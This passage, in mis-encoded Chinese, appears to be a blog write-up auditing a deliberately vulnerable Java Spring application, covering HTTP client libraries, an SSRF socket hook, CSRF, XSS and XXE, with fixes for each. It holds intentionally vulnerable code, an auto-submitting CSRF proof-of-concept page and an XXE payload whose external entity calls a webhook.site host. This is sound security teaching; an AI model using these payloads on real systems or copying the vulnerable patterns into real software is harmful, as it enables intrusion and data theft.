<td>æ€§èƒ½ä¸é”™ï¼Œæä¾›äº†å¤æ‚åœºæ™¯ä¸‹çš„ä¼˜åŒ–ç­–ç•¥ï¼Œé€‚åˆé«˜è´Ÿè½½çš„åº”ç”¨ç¨‹åºï¼Œä½†ç›¸å¯¹äº OkHttp æ¥è¯´ç¨é‡ã€‚</td>
</tr>
<tr>
<td><strong>CommonHttpClient</strong></td>
<td>æ€§èƒ½è¾ƒå¼±ï¼Œç¼ºä¹ç°ä»£ HTTP å®¢æˆ·ç«¯çš„ä¸€äº›ä¼˜åŒ–ï¼ˆå¦‚è¿æ¥æ± ç®¡ç†ï¼‰ï¼Œç”±äº API å·²è¿‡æ—¶ï¼Œæ€§èƒ½ä¸å¦‚ OkHttp å’Œ HttpClientã€‚</td>
</tr>
<tr>
<td><strong>Jsoup</strong></td>
<td>åœ¨å¤„ç† HTML æ–‡æ¡£æ–¹é¢æ€§èƒ½ä¸é”™ï¼Œä½†åœ¨ HTTP è¯·æ±‚æ–¹é¢ä¸å¦‚ OkHttp æˆ– HttpClient é«˜æ•ˆã€‚</td>
</tr>
<tr>
<td><strong>IOUtils</strong></td>
<td>æ€§èƒ½è¾ƒä½ï¼Œå› ä¸ºå®ƒä¸æä¾›è¿æ¥æ± å’Œé«˜çº§ HTTP ä¼˜åŒ–æœºåˆ¶ï¼Œåªé€‚åˆå°å‹èµ„æºçš„è¯»å–ï¼Œåœ¨å¤§æ•°æ®æˆ–é«˜é¢‘è¯·æ±‚åœºæ™¯ä¸­è¡¨ç°ä¸ä½³ã€‚</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>åº“åç§°</th>
<th>é€‚ç”¨åœºæ™¯</th>
</tr>
</thead>
<tbody><tr>
<td><strong>OkHttp</strong></td>
<td>é€‚ç”¨äºå¤§å¤šæ•° HTTP é€šä¿¡åœºæ™¯ï¼ŒåŒ…æ‹¬åŒæ­¥å’Œå¼‚æ­¥è¯·æ±‚ã€API è°ƒç”¨ã€RESTful æœåŠ¡ã€WebSocket é€šä¿¡ç­‰ï¼Œç‰¹åˆ«é€‚åˆéœ€è¦é«˜æ€§èƒ½å’Œçµæ´»æ€§çš„åœºæ™¯ã€‚</td>
</tr>
<tr>
<td><strong>HttpClient</strong></td>
<td>é€‚ç”¨äºå¤æ‚çš„ HTTP é€šä¿¡åœºæ™¯ï¼Œå°¤å…¶æ˜¯éœ€è¦ä»£ç†ã€èº«ä»½è®¤è¯ã€é‡å®šå‘ç®¡ç†ç­‰é«˜çº§åŠŸèƒ½çš„é¡¹ç›®ã€‚</td>
</tr>
<tr>
<td><strong>CommonHttpClient</strong></td>
<td>ä¸»è¦ç”¨äºè€æ—§é¡¹ç›®çš„å…¼å®¹ï¼Œæˆ–è€ç³»ç»Ÿä¸­é—ç•™çš„ä»£ç åº“ï¼Œå·²ç»è¢«å¼ƒç”¨ï¼Œä¸å»ºè®®åœ¨æ–°é¡¹ç›®ä¸­ä½¿ç”¨ã€‚</td>
</tr>
<tr>
<td><strong>Jsoup</strong></td>
<td>é€‚åˆ Web çˆ¬è™«å’Œ HTML è§£æä»»åŠ¡ï¼Œèƒ½å¤Ÿæ–¹ä¾¿åœ°å¤„ç†å’Œæ“ä½œ HTML é¡µé¢ï¼Œä¸»è¦ç”¨äºæŠ“å–ç½‘é¡µå¹¶ä»ä¸­æå–æ•°æ®ï¼Œä¸é€‚åˆå¤æ‚ HTTP è¯·æ±‚é…ç½®çš„åœºæ™¯ã€‚</td>
</tr>
<tr>
<td><strong>IOUtils</strong></td>
<td>é€‚ç”¨äºç®€å•çš„æ•°æ®è¯»å–åœºæ™¯ï¼Œå¦‚ä» URL è¯»å–å°å‹æ–‡ä»¶ã€å›¾åƒç­‰ï¼Œé€‚åˆè½»é‡çº§ä»»åŠ¡ï¼Œä½†ä¸é€‚åˆé¢‘ç¹è¯·æ±‚æˆ–å¤æ‚çš„ HTTP è¯·æ±‚åœºæ™¯ã€‚</td>
</tr>
</tbody></table>
<p><strong>æ€»ç»“</strong></p>
<ul>
<li><strong>OkHttp</strong> æ˜¯ä¸€ä¸ªç°ä»£ä¸”çµæ´»çš„ HTTP å®¢æˆ·ç«¯ï¼Œæ€§èƒ½å¥½ï¼Œé€‚ç”¨äºå¤§å¤šæ•° HTTP é€šä¿¡ä»»åŠ¡ã€‚</li>
<li><strong>HttpClient</strong> æ›´é€‚åˆå¤æ‚çš„ HTTP é€šä¿¡åœºæ™¯ï¼Œæœ‰è¾ƒå¼ºçš„åŠŸèƒ½æ”¯æŒï¼Œå¦‚è®¤è¯ã€é‡å®šå‘ç­‰ï¼Œä½†ç›¸å¯¹å¤æ‚ï¼Œé€‚åˆå¤§å‹é¡¹ç›®ã€‚</li>
<li><strong>CommonHttpClient</strong> å·²ç»è¿‡æ—¶ï¼Œä¸»è¦ç”¨äºè€é¡¹ç›®çš„å…¼å®¹ï¼Œä¸æ¨èåœ¨æ–°é¡¹ç›®ä¸­ä½¿ç”¨ã€‚</li>
<li><strong>Jsoup</strong> é€‚åˆå¤„ç† HTML è§£æä»»åŠ¡å’Œè½»é‡çš„ HTTP è¯·æ±‚ï¼Œä¸“æ³¨äºç½‘é¡µæŠ“å–å’Œæ•°æ®æå–ã€‚</li>
<li><strong>IOUtils</strong> åˆ™æ˜¯ä¸€ä¸ªç®€åŒ–çš„å·¥å…·ï¼Œä¸»è¦ç”¨äºè¯»å– URL å†…å®¹å¹¶è½¬æ¢ä¸ºå­—èŠ‚æµï¼Œé€‚åˆç®€å•çš„å°æ•°æ®ä¼ è¾“ã€‚</li>
</ul>
<h4 id="ï¼ˆ4ï¼‰æ ¸å¿ƒSSRFé˜²æŠ¤ä»£ç "><a href="#ï¼ˆ4ï¼‰æ ¸å¿ƒSSRFé˜²æŠ¤ä»£ç " class="headerlink" title="ï¼ˆ4ï¼‰æ ¸å¿ƒSSRFé˜²æŠ¤ä»£ç "></a>ï¼ˆ4ï¼‰æ ¸å¿ƒSSRFé˜²æŠ¤ä»£ç </h4><p>ä¿®å¤ä»£ç ï¼š</p>
<pre><code class="java">public class SocketHook &#123;

    public static void startHook() throws IOException &#123;
        SocketHookFactory.initSocket();
        SocketHookFactory.setHook(true);
        try&#123;
            Socket.setSocketImplFactory(new SocketHookFactory());
        &#125;catch (SocketException ignored)&#123;
        &#125;
    &#125;

    public static void stopHook()&#123;
        SocketHookFactory.setHook(false);
    &#125;
&#125;
</code></pre>
<p><strong>åŠŸèƒ½åˆ†æ</strong>ï¼š</p>
<ul>
<li><strong><code>startHook()</code></strong>:<ul>
<li>å¯åŠ¨ <code>SocketHook</code>ï¼Œå¯¹æ‰€æœ‰æ–°åˆ›å»ºçš„ <code>Socket</code> åº”ç”¨è‡ªå®šä¹‰è¡Œä¸ºã€‚æ ¸å¿ƒæ˜¯é€šè¿‡ <code>Socket.setSocketImplFactory()</code> æ¥è®¾ç½®ä¸€ä¸ªæ–°çš„ <code>Socket</code> å·¥å‚ã€‚</li>
<li>å¯èƒ½ç”¨äºåœ¨ <code>Socket</code> è¿æ¥æœŸé—´ç›‘æ§ã€ä¿®æ”¹ã€æˆ–å®¡æŸ¥æ•°æ®æµé‡ã€‚</li>
</ul>
</li>
<li><strong><code>stopHook()</code></strong>:<ul>
<li>å…³é—­ <code>SocketHook</code>ï¼Œå°† <code>SocketHookFactory</code> ä¸­çš„é’©å­çŠ¶æ€å…³é—­ï¼Œåœæ­¢å¯¹æ–° <code>Socket</code> å®ä¾‹çš„è‡ªå®šä¹‰è¡Œä¸ºã€‚</li>
</ul>
</li>
</ul>
<p><strong>åº”ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li><strong>å®‰å…¨é˜²æŠ¤</strong>ï¼šå¯ä»¥ç”¨æ¥æ£€æµ‹ã€æ‹¦æˆªæˆ–ä¿®æ”¹ç‰¹å®šçš„ç½‘ç»œè¿æ¥ï¼Œé˜²æ­¢æ”»å‡»ï¼ˆå¦‚ SSRFã€RFI ç­‰ï¼‰é€šè¿‡ä¸å—æ§åˆ¶çš„ç½‘ç»œè¯·æ±‚æ»¥ç”¨æœåŠ¡å™¨èµ„æºã€‚</li>
<li><strong>ç½‘ç»œå®¡è®¡</strong>ï¼šå¯ç”¨äºç›‘æ§ç½‘ç»œæµé‡ï¼Œä»¥è®°å½•æˆ–åˆ†æ <code>Socket</code> é€šä¿¡å†…å®¹ã€‚</li>
<li><strong>è°ƒè¯•&#x2F;æµ‹è¯•</strong>ï¼šåœ¨è°ƒè¯•æˆ–æµ‹è¯•ç¯å¢ƒä¸­ï¼Œä½¿ç”¨é’©å­æ¥æ•è·å’Œåˆ†æç½‘ç»œé€šä¿¡è¡Œä¸ºã€‚</li>
</ul>
<h2 id="äº”ã€CSRF"><a href="#äº”ã€CSRF" class="headerlink" title="äº”ã€CSRF"></a>äº”ã€CSRF</h2><p> <strong>CSRF æ”»å‡»åŸç†</strong></p>
<p>CSRF çš„æ ¸å¿ƒæ˜¯åˆ©ç”¨ç”¨æˆ·çš„èº«ä»½è®¤è¯ä¼šè¯ã€‚ä¾‹å¦‚ï¼Œç”¨æˆ·åœ¨ç™»å½•æŸä¸ªç½‘ç«™åï¼Œæ‹¥æœ‰ä¸€ä¸ªæœ‰æ•ˆçš„ä¼šè¯ Cookieï¼Œè¿™ä¸ª Cookie å…è®¸ç”¨æˆ·åœ¨ä¸é‡æ–°ç™»å½•çš„æƒ…å†µä¸‹æ‰§è¡Œåç»­æ“ä½œã€‚æ”»å‡»è€…é€šè¿‡è¯±å¯¼ç”¨æˆ·è®¿é—®æ¶æ„ç½‘ç«™ï¼Œè‡ªåŠ¨å‘å—ä¿¡ä»»ç½‘ç«™å‘é€åˆæ³•çš„è¯·æ±‚ï¼ˆæºå¸¦äº†ç”¨æˆ·çš„ä¼šè¯ Cookieï¼‰ï¼Œä»è€Œè®©æœåŠ¡å™¨è®¤ä¸ºæ˜¯åˆæ³•ç”¨æˆ·å‘èµ·çš„æ“ä½œã€‚</p>
<p><strong>æ”»å‡»æµç¨‹ï¼š</strong></p>
<ol>
<li>ç”¨æˆ·åœ¨æµè§ˆå™¨ä¸­ç™»å½•äº†å—ä¿¡ä»»çš„ç½‘ç«™ï¼ˆå¦‚é“¶è¡Œç½‘ç«™ï¼‰ï¼Œå¹¶ä¸”æ‹¥æœ‰æœ‰æ•ˆçš„ä¼šè¯ã€‚</li>
<li>æ”»å‡»è€…åˆ›å»ºäº†ä¸€ä¸ªæ¶æ„ç½‘ç«™ï¼ŒåµŒå…¥äº†å‘å—ä¿¡ä»»ç½‘ç«™å‘é€è¯·æ±‚çš„ä»£ç ã€‚</li>
<li>ç”¨æˆ·åœ¨ç™»å½•å—ä¿¡ä»»ç½‘ç«™åï¼Œè®¿é—®äº†æ”»å‡»è€…çš„æ¶æ„ç½‘ç«™ï¼Œæ¶æ„ç½‘ç«™åœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ï¼Œè‡ªåŠ¨å‘å—ä¿¡ä»»ç½‘ç«™å‘é€è¯·æ±‚ï¼ˆå¦‚è½¬è´¦è¯·æ±‚ï¼‰ã€‚</li>
<li>å—ä¿¡ä»»çš„ç½‘ç«™æ— æ³•åŒºåˆ†è¯¥è¯·æ±‚æ˜¯ç”¨æˆ·å‘èµ·çš„è¿˜æ˜¯æ”»å‡»è€…ä¼ªé€ çš„ï¼Œå› æ­¤ä¼šæ‰§è¡Œè¿™ä¸ªè¯·æ±‚ã€‚</li>
</ol>
<h3 id="1-è·¯ç”±-x2F-csrf-x2F-post"><a href="#1-è·¯ç”±-x2F-csrf-x2F-post" class="headerlink" title="1.è·¯ç”±&#x2F;csrf&#x2F;post"></a>1.è·¯ç”±&#x2F;csrf&#x2F;post</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="Java">@Controller
@RequestMapping(&quot;/csrf&quot;)
public class CSRF &#123;

    @GetMapping(&quot;/&quot;)
    public String index() &#123;
        return &quot;form&quot;;
    &#125;

    @PostMapping(&quot;/post&quot;)
    @ResponseBody
    public String post() &#123;
        return &quot;CSRF passed.&quot;;
    &#125;
&#125;
</code></pre>
<p>å¯¹åº”å‰ç«¯ä»£ç ï¼š</p>
<pre><code class="html">
&lt;html xmlns:th=&quot;http://www.thymeleaf.org&quot; lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;script th:src=&quot;@&#123;https://code.jquery.com/jquery-3.4.1.min.js&#125;&quot;&gt;&lt;/script&gt;
&lt;/head&gt;



&lt;body&gt;


&lt;div&gt;
    &lt;!-- th:action with Spring 3.2+ and Thymeleaf 2.1+ can automatically force Thymeleaf to include the CSRF token as a hidden field --&gt;
    &lt;!-- &lt;form name=&quot;f&quot; th:action=&quot;@&#123;/csrf/post&#125;&quot; method=&quot;post&quot;&gt; --&gt;
    &lt;form name=&quot;f&quot; action=&quot;/csrf/post&quot; method=&quot;post&quot;&gt;
        &lt;input type=&quot;text&quot; name=&quot;input&quot; /&gt;
        &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;
        &lt;input type=&quot;hidden&quot; th:name=&quot;$&#123;_csrf.parameterName&#125;&quot; th:value=&quot;$&#123;_csrf.token&#125;&quot; /&gt;
    &lt;/form&gt;
&lt;/div&gt;


&lt;/body&gt;




&lt;/html&gt;
</code></pre>
<p>è¯¥ä»£ç å­˜åœ¨csrfæ¼æ´ï¼Œæ¼æ´éªŒè¯pocï¼š</p>
<pre><code class="html">&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
    &lt;title&gt;CSRF Exploit&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;Simulating CSRF Attack&lt;/h1&gt;

    &lt;form id=&quot;csrfForm&quot; action=&quot;http://127.0.0.1:8080/csrf/post&quot; method=&quot;POST&quot;&gt;
        &lt;input type=&quot;hidden&quot; name=&quot;message&quot; value=&quot;This is a CSRF attack message&quot;&gt;
    &lt;/form&gt;

    &lt;script&gt;
        // è‡ªåŠ¨æäº¤è¡¨å•ï¼Œæ‰§è¡Œæ”»å‡»
        document.getElementById(&#39;csrfForm&#39;).submit();
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>è®¿é—®è¯¥é¡µé¢ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨è¯¥è·¯ç”±å®ç°CSRFæ”»å‡»ã€‚</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008104016372.png" alt="image-20241008104016372"></p>
<h3 id="CSRFé˜²æŠ¤"><a href="#CSRFé˜²æŠ¤" class="headerlink" title="CSRFé˜²æŠ¤"></a>CSRFé˜²æŠ¤</h3><p><strong>ä½¿ç”¨CSRF Token</strong>ï¼š</p>
<ul>
<li>æœåŠ¡å™¨ç”Ÿæˆä¸€ä¸ªå”¯ä¸€çš„CSRF Tokenå¹¶å°†å…¶å‘é€ç»™ç”¨æˆ·ï¼ˆé€šå¸¸é€šè¿‡éšè—å­—æ®µã€URLå‚æ•°æˆ–HTTPå¤´ï¼‰ã€‚</li>
<li>åœ¨æäº¤è¡¨å•æˆ–å‘èµ·è¯·æ±‚æ—¶ï¼Œå®¢æˆ·ç«¯å°†è¯¥Tokenä¸€åŒå‘é€å›æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨éªŒè¯Tokençš„æœ‰æ•ˆæ€§ä»¥é˜²æ­¢ä¼ªé€ è¯·æ±‚ã€‚</li>
</ul>
<p><strong>SameSite Cookie å±æ€§</strong>ï¼š</p>
<ul>
<li>è®¾ç½®Cookieçš„<code>SameSite</code>å±æ€§ä¸º<code>Strict</code>æˆ–<code>Lax</code>ï¼Œé™åˆ¶ç¬¬ä¸‰æ–¹ç½‘ç«™é€šè¿‡è·¨ç«™ç‚¹æ–¹å¼å‘é€Cookieã€‚</li>
<li><code>Strict</code>ï¼šç¦æ­¢ä»»ä½•è·¨ç«™è¯·æ±‚æºå¸¦Cookieã€‚</li>
<li><code>Lax</code>ï¼šå…è®¸ä¸€äº›å®‰å…¨çš„è·¨ç«™è¯·æ±‚ï¼ˆä¾‹å¦‚GETè¯·æ±‚ï¼‰ï¼Œä½†é˜»æ­¢POSTç­‰æ•æ„Ÿæ“ä½œã€‚</li>
</ul>
<p><strong>åŒé‡CookieéªŒè¯</strong>ï¼š</p>
<ul>
<li>æœåŠ¡å™¨å‘é€ä¸€ä¸ªCookieç»™ç”¨æˆ·ï¼Œå®¢æˆ·ç«¯åœ¨è¯·æ±‚æ—¶ä¼šè‡ªåŠ¨æºå¸¦è¯¥Cookieã€‚</li>
<li>å®¢æˆ·ç«¯è¿˜éœ€è¦åœ¨è¡¨å•ä¸­æºå¸¦ç›¸åŒçš„å€¼ï¼ˆé€šè¿‡JSä»Cookieä¸­æå–ï¼‰ï¼ŒæœåŠ¡å™¨æ£€æŸ¥è¿™ä¸¤ä¸ªå€¼æ˜¯å¦åŒ¹é…ã€‚</li>
</ul>
<p><strong>æ£€æŸ¥Refererå¤´</strong>ï¼š</p>
<ul>
<li>æœåŠ¡å™¨é€šè¿‡éªŒè¯è¯·æ±‚å¤´ä¸­çš„<code>Referer</code>å­—æ®µæ˜¯å¦æ¥è‡ªåˆæ³•çš„åŸŸåï¼Œæ¥ç¡®å®šè¯·æ±‚æ˜¯å¦æ¥è‡ªå¯ä¿¡æ¥æºã€‚</li>
<li>è¿™ç§æ–¹æ³•å¹¶ä¸å®Œå…¨å¯é ï¼Œå› ä¸ºæœ‰äº›ç¯å¢ƒä¸‹<code>Referer</code>å¤´å¯èƒ½ä¼šè¢«ä¿®æ”¹æˆ–çœç•¥ã€‚</li>
</ul>
<p><strong>CAPTCHA</strong>ï¼š</p>
<ul>
<li>ä½¿ç”¨CAPTCHAæ¥ç¡®ä¿è¯·æ±‚æ˜¯ç”±çœŸå®ç”¨æˆ·è€Œéè‡ªåŠ¨åŒ–è„šæœ¬å‘èµ·ï¼Œè™½ç„¶è¿™ç§æ–¹å¼ä¸èƒ½å®Œå…¨é˜²æŠ¤CSRFï¼Œä½†èƒ½å¢åŠ æ”»å‡»éš¾åº¦ã€‚</li>
</ul>
<p><strong>é™åˆ¶è¯·æ±‚æ¥æº</strong>ï¼š</p>
<ul>
<li>å¯¹æ•æ„Ÿæ“ä½œï¼ˆå¦‚èµ„é‡‘è½¬ç§»ã€ä¿®æ”¹è´¦æˆ·ä¿¡æ¯ç­‰ï¼‰è®¾ç½®è¯·æ±‚æ¥æºçš„ä¸¥æ ¼éªŒè¯ï¼Œç¡®ä¿è¿™äº›æ“ä½œåªèƒ½é€šè¿‡ç‰¹å®šçš„åˆæ³•æ¥æºè¿›è¡Œã€‚</li>
</ul>
<h2 id="å…­ã€XSS"><a href="#å…­ã€XSS" class="headerlink" title="å…­ã€XSS"></a>å…­ã€XSS</h2><h3 id="1-è·¯ç”±-x2F-xss-x2F-reflect"><a href="#1-è·¯ç”±-x2F-xss-x2F-reflect" class="headerlink" title="1.è·¯ç”±&#x2F;xss&#x2F;reflect"></a>1.è·¯ç”±&#x2F;xss&#x2F;reflect</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="Java"> @RequestMapping(&quot;/reflect&quot;)
    @ResponseBody
    public static String reflect(String xss) &#123;
        return xss;
    &#125;
</code></pre>
<p>å­˜åœ¨åå°„å‹xssï¼ŒéªŒè¯æ¼æ´ï¼š</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008104436572.png" alt="image-20241008104436572"></p>
<h3 id="2-è·¯ç”±-x2F-xss-x2F-stored"><a href="#2-è·¯ç”±-x2F-xss-x2F-stored" class="headerlink" title="2.è·¯ç”±&#x2F;xss&#x2F;stored"></a>2.è·¯ç”±&#x2F;xss&#x2F;stored</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="Java"> @RequestMapping(&quot;/stored/store&quot;)
    @ResponseBody
    public String store(String xss, HttpServletResponse response) &#123;
        Cookie cookie = new Cookie(&quot;xss&quot;, xss);
        response.addCookie(cookie);
        return &quot;Set param into cookie&quot;;
    &#125;

    /**
     * Vul Code.
     * StoredXSS Step2
     * http://localhost:8080/xss/stored/show
     *
     * @param xss unescape string
     */
    @RequestMapping(&quot;/stored/show&quot;)
    @ResponseBody
    public String show(@CookieValue(&quot;xss&quot;) String xss) &#123;
        return xss;
    &#125;
</code></pre>
<p>å­˜åœ¨å­˜å‚¨å‹xssï¼Œæ¼æ´éªŒè¯ï¼š</p>
<p>å…ˆåˆ©ç”¨è·¯ç”±<code>/xss/stored/store</code>å°†æ¶æ„ä»£ç å­˜åˆ°cookieä¸­</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008104751040.png" alt="image-20241008104751040"></p>
<p>å†è®¿é—®<code>/xss/stored/show</code>è·¯ç”±å®ç°æ”»å‡»ï¼š</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008104854995.png" alt="image-20241008104854995"></p>
<h3 id="XSSæ”»å‡»é˜²æŠ¤"><a href="#XSSæ”»å‡»é˜²æŠ¤" class="headerlink" title="XSSæ”»å‡»é˜²æŠ¤"></a>XSSæ”»å‡»é˜²æŠ¤</h3><p>é˜²æŠ¤ä»£ç ï¼š</p>
<pre><code>    @RequestMapping(&quot;/safe&quot;)
    @ResponseBody
    public static String safe(String xss) &#123;
        return encode(xss);
    &#125;

    private static String encode(String origin) &#123;
        origin = StringUtils.replace(origin, &quot;&amp;&quot;, &quot;&amp;amp;&quot;);
        origin = StringUtils.replace(origin, &quot;&lt;&quot;, &quot;&amp;lt;&quot;);
        origin = StringUtils.replace(origin, &quot;&gt;&quot;, &quot;&amp;gt;&quot;);
        origin = StringUtils.replace(origin, &quot;\&quot;&quot;, &quot;&amp;quot;&quot;);
        origin = StringUtils.replace(origin, &quot;&#39;&quot;, &quot;&amp;#x27;&quot;);
        origin = StringUtils.replace(origin, &quot;/&quot;, &quot;&amp;#x2F;&quot;);
        return origin;
    &#125;
&#125;
</code></pre>
<p>å¯¹ä¸€äº›å¯èƒ½ä¼šè¢«åˆ©ç”¨çš„å…³é”®å­—è¿›è¡Œæ›¿æ¢æˆå®‰å…¨çš„ç¼–ç </p>
<h2 id="ä¸ƒã€XXE"><a href="#ä¸ƒã€XXE" class="headerlink" title="ä¸ƒã€XXE"></a>ä¸ƒã€XXE</h2><h3 id="1-è·¯ç”±-x2F-xxe-x2F-xmlReader-x2F-vuln"><a href="#1-è·¯ç”±-x2F-xxe-x2F-xmlReader-x2F-vuln" class="headerlink" title="1.è·¯ç”±&#x2F;xxe&#x2F;xmlReader&#x2F;vuln"></a>1.è·¯ç”±&#x2F;xxe&#x2F;xmlReader&#x2F;vuln</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="Java">@PostMapping(&quot;/xmlReader/vuln&quot;)
    public String xmlReaderVuln(HttpServletRequest request) &#123;
        try &#123;
            String body = WebUtils.getRequestBody(request);
            logger.info(body);
            XMLReader xmlReader = XMLReaderFactory.createXMLReader();
            xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml
            return &quot;xmlReader xxe vuln code&quot;;
        &#125; catch (Exception e) &#123;
            logger.error(e.toString());
            return EXCEPT;
        &#125;
    &#125;
</code></pre>
<h3 id="2-è·¯ç”±-x2F-xxe-x2F-SAXBuilder-x2F-vuln"><a href="#2-è·¯ç”±-x2F-xxe-x2F-SAXBuilder-x2F-vuln" class="headerlink" title="2.è·¯ç”±&#x2F;xxe&#x2F;SAXBuilder&#x2F;vuln"></a>2.è·¯ç”±&#x2F;xxe&#x2F;SAXBuilder&#x2F;vuln</h3><pre><code class="java">@RequestMapping(value = &quot;/SAXBuilder/vuln&quot;, method = RequestMethod.POST)
    public String SAXBuilderVuln(HttpServletRequest request) &#123;
        try &#123;
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXBuilder builder = new SAXBuilder();
            // org.jdom2.Document document
            builder.build(new InputSource(new StringReader(body)));  // cause xxe
            return &quot;SAXBuilder xxe vuln code&quot;;
        &#125; catch (Exception e) &#123;
            logger.error(e.toString());
            return EXCEPT;
        &#125;
    &#125;
</code></pre>
<p>æ¢ç”¨SAXReaderç¬¬ä¸‰æ–¹åº“ï¼Œæ”»å‡»æ‰‹æ³•åŒä¸Šï¼š</p>
<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;https://webhook.site/bef89c10-3850-4342-8f7e-934073c0cc12&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;
</code></pre>
<p>POSTå‘é€:</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008110604490.png" alt="image-20241008110604490"></p>
<p>æ¥æ”¶åˆ°dnslogï¼š</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008110623158.png" alt="image-20241008110623158"></p>
<p><strong>ä¿®å¤ä»£ç </strong></p>
<p>åŸç†åŒä¸Šï¼Œç¦ç”¨äº†å¤–éƒ¨å®ä½“ï¼š</p>
<pre><code class="Java">    @RequestMapping(value = &quot;/SAXBuilder/sec&quot;, method = RequestMethod.POST)
    public String SAXBuilderSec(HttpServletRequest request) &#123;
        try &#123;
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXBuilder builder = new SAXBuilder();
            builder.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);
            builder.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);
            builder.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);
            // org.jdom2.Document document
            builder.build(new InputSource(new StringReader(body)));

        &#125; catch (Exception e) &#123;
            logger.error(e.toString());
            return EXCEPT;
        &#125;

        return &quot;SAXBuilder xxe security code&quot;;
    &#125;
</code></pre>
<h3 id="3-è·¯ç”±-x2F-xxe-x2F-SAXReader-x2F-vuln"><a href="#3-è·¯ç”±-x2F-xxe-x2F-SAXReader-x2F-vuln" class="headerlink" title="3.è·¯ç”±&#x2F;xxe&#x2F;SAXReader&#x2F;vuln"></a>3.è·¯ç”±&#x2F;xxe&#x2F;SAXReader&#x2F;vuln</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="Java">@RequestMapping(value = &quot;/SAXReader/vuln&quot;, method = RequestMethod.POST)
    public String SAXReaderVuln(HttpServletRequest request) &#123;
        try &#123;
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXReader reader = new SAXReader();
            // org.dom4j.Document document
            reader.read(new InputSource(new StringReader(body))); // cause xxe

        &#125; catch (Exception e) &#123;
            logger.error(e.toString());
            return EXCEPT;
        &#125;

        return &quot;SAXReader xxe vuln code&quot;;
    &#125;
</code></pre>
<p>è·Ÿä¸Šé¢çš„åŒºåˆ«æ˜¯è¯¥ç±»æœ‰å›æ˜¾ï¼Œpayloadä¸å˜</p>
<h3 id="4-è·¯ç”±-x2F-xxe-x2F-SAXParser-x2F-vuln"><a href="#4-è·¯ç”±-x2F-xxe-x2F-SAXParser-x2F-vuln" class="headerlink" title="4.è·¯ç”±&#x2F;xxe&#x2F;SAXParser&#x2F;vuln"></a>4.è·¯ç”±&#x2F;xxe&#x2F;SAXParser&#x2F;vuln</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="java">  @RequestMapping(value = &quot;/SAXParser/vuln&quot;, method = RequestMethod.POST)
    public String SAXParserVuln(HttpServletRequest request) &#123;
        try &#123;
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXParserFactory spf = SAXParserFactory.newInstance();
            SAXParser parser = spf.newSAXParser();
            parser.parse(new InputSource(new StringReader(body)), new DefaultHandler());  // parse xml

            return &quot;SAXParser xxe vuln code&quot;;
        &#125; catch (Exception e) &#123;
            logger.error(e.toString());
            return EXCEPT;
        &#125;
    &#125;
</code></pre>
<h3 id="5-è·¯ç”±-x2F-xxe-x2F-Digester-x2F-vuln"><a href="#5-è·¯ç”±-x2F-xxe-x2F-Digester-x2F-vuln" class="headerlink" title="5.è·¯ç”±&#x2F;xxe&#x2F;Digester&#x2F;vuln"></a>5.è·¯ç”±&#x2F;xxe&#x2F;Digester&#x2F;vuln</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="java">@RequestMapping(value = &quot;/Digester/vuln&quot;, method = RequestMethod.POST)
    public String DigesterVuln(HttpServletRequest request) &#123;
        try &#123;
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            Digester digester = new Digester();
            digester.parse(new StringReader(body));  // parse xml
        &#125; catch (Exception e) &#123;
            logger.error(e.toString());
            return EXCEPT;
        &#125;
        return &quot;Digester xxe vuln code&quot;;
    &#125;
</code></pre>
<h3 id="6-è·¯ç”±-x2F-xxe-x2F-DocumentBuilder-x2F-vuln"><a href="#6-è·¯ç”±-x2F-xxe-x2F-DocumentBuilder-x2F-vuln" class="headerlink" title="6.è·¯ç”±&#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln"></a>6.è·¯ç”±&#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="java">@RequestMapping(value = &quot;/DocumentBuilder/vuln&quot;, method = RequestMethod.POST)
    public String DocumentBuilderVuln(HttpServletRequest request) &#123;
        try &#123;
            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            DocumentBuilder db = dbf.newDocumentBuilder();
            InputSource is = new InputSource(request.getInputStream());
